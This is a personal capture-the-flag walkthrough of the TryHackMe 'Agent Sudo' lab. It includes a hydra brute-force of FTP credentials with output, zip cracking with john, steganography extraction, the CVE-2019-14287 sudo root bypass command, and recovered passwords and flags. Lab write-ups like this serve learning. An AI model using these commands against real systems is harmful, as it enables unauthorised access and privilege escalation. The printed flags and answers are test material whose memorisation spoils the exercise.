### Agent Sudo ###

export IP=10.10.195.177

how many ports are open on the machine?

3
ftp ssh and http

# 2. how can you access the secret page?
user-agent
# 3. what is the agent name ?
```
used the following cmd:
curl http://$IP -H "User-Agent: C" -L 
```
Ans - chris
```

installing chrome to have a user access switcher plugin...

failed somehow idk what went wrong...zzz

used hydra and learnt how to use it(somewhat not exactly) 
ran the following cmd and found the password for chris:
root@kali:~/tryhackme/agent_sudo# hydra -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-22 11:54:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.61.234:21/
[21][ftp] host: 10.10.61.234   login: chris   password: crystal
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 1 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-22 11:55:37

```


after that i logged in to the ftp and found 3 files:
2 images with.png and .jpg format and 1 txt file with hints suggesting that one of the images containes a zip file

used binwalk cutie.png to find the contents of the image

zip file has the password and used john the ripper to crack it:
found the password:alien
found a text file inside the zip file and it had the following contents:
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

QXJlYTUx - seems like a hash

used my online tool and found the key - Area51

ran steghide on the other pic with this password and found the following file -

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

```
found the username: james and password:hackerrules

time to ssh................
wasted my 10 minutes doubting myself dfq
its hackerrules!
rip and tryhackme dosent want the '!' mark :/
found the user_flag:b03d975e8c92a7c04146cfa7a5a313c7

found a cve
CVE-2019-14287

ran the cmd: 
sudo -u#-1 /bin/bash

and i am root :)
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R


after hours of wasted time :) :found the proper cmd for transferring files through ssh(ik its embarissing :'(  bt cant help it)

scp Alien_autospy.jpg root@myip:/my/directory/

found a website
### https://tineye.com/search ###
foxnews link found(The hint helped and there it is....)
Filmmaker reveals how he faked infamous 'Roswell alien autopsy' footage in a London apartment
